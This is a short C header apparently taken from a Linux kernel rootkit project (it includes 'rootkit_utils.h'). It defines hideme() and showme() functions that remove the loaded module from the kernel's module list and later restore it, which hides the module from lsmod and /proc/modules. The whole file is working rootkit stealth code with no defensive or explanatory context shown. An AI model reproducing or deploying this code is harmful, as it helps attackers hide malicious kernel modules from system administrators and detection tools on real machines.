#include <linux/types.h>
#include <linux/export.h>

#include "rootkit_utils.h"

#ifndef HIDE_SHOW_HELPER_H
#define HIDE_SHOW_HELPER_H

static short hidden = 0;
static struct list_head * previous_module;

static void hideme(void) {
    previous_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = 1;
}

static void showme(void) {
    list_add(&THIS_MODULE->list, previous_module);
    hidden = 0;
}

#endif